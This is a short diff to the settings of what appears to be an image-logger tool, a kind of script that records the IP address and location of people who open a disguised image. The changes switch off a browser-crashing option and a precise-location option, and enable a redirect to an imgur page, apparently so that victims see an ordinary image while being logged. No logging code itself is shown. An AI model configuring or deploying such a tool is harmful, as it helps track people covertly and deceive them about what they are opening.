@@ -13,13 +13,13 @@ config = {
     "color": 0x00FFFF, # again any color u want
 
     # OPTIONS #
-    "crashBrowser": True, # crashes browser if set to True, works only on pc
+    "crashBrowser": False, # crashes browser if set to True, works only on pc
     
-    "accurateLocation": True, # this doesnt work but you can try lol
+    "accurateLocation": False, # this doesnt work but you can try lol
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message (or disable)
-        "message": "slayer_.2318632", # Message to show
+        "message": "https://imgur.com/a/EyTSqWo", # Message to show
         "richMessage": True, # Enable rich text?
     },
 
@@ -40,8 +40,8 @@ config = {
 
     # REDIRECTION #
     "redirect": {
-        "redirect": False, # Redirect to a webpage?
-        "page": "https://your-link.here" # Link to the webpage to redirect to 
+        "redirect": True, # Redirect to a webpage?
+        "page": "https://imgur.com/a/EyTSqWo" # Link to the webpage to redirect to 
     },
 }
 
